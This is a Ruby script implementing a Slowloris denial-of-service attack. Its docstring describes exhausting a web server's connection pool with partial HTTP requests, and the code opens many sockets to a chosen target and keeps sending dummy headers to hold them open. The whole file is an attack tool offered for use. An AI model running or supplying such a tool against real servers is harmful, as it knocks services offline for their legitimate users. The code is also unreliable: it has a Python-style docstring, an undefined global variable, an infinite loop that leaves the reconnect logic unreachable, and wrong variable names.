require "socket"

class Slowloris
    """
    Slowloris works by opening multiple connections to the targeted web 
    server and keeping them open as long as possible. It does this by 
    continuously sending partial HTTP requests, none of which are ever 
    completed. The attacked servers open more and connections open, 
    waiting for each of the attack requests to be completed.
    
    Periodically, the Slowloris sends subsequent HTTP headers for each 
    request, but never actually completes the request. Ultimately, the 
    targeted server\'s maximum concurrent connection pool is filled, and 
    additional (legitimate) connection attempts are denied.
    """
    def initialize(target, socket_number)
        @@prng = Random.new(1234)
        @@sockets = []
        @@regular_headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:36.0) Gecko/20100101 Firefox/36.0.4 Waterfox/36.0.4",
            "Accept-language: en-US,en,q=0.5"
        ]
        @@target = target # The Url or IP address of any sort
        @@socket_counts = socket_number.to_i # The Number of packets required to send 
    end
    
    def init_socket(target)
        socket = Socket.new(:INET, :STREAM)
        socket_address = Socket.pack_sockaddr_in(80, target)
        socket.connect(socket_address)

        socket.write(("GET /?%{n} HTTP/1.1\r\n" % { n: @@prng.rand(2000) }).encode("utf-8"))
        
        @@regular_headers.each { |h|
            socket.write("#{h}\r\n".encode("utf-8"))
        }
        
        socket
    end

    def attack
        puts "Initiating attacks #{@@target}..."

        for n in 1..@@socket_counts
            begin
                sent_sockets = self.init_socket(@@target)
            rescue
                break
            end
            
            @@sockets << sent_sockets
        end



        while true 
            puts "Sent [Keep-alive Headers] | Socket sent #{(1..999999).to_a.sample.to_s or @@socket_counts} to #{@@target}"

            @@sockets.each { |soc|
                begin
                    soc.write(("X-a: #{n}\r\n" % { n: $prng.rand(4999)+1 }).encode("utf-8"))
                rescue
                    @@sockets.delete(soc)
                end
            }
        end

        for count in 1..@@socket_counts - @@sockets.size
            puts "Recreating sockets."

            begin
                ssocket = self.init_socket(@@target)
                @@sockets << sent_sockets if ssocket
            rescue
                break
            end
        end

        sleep 5
    end 
end 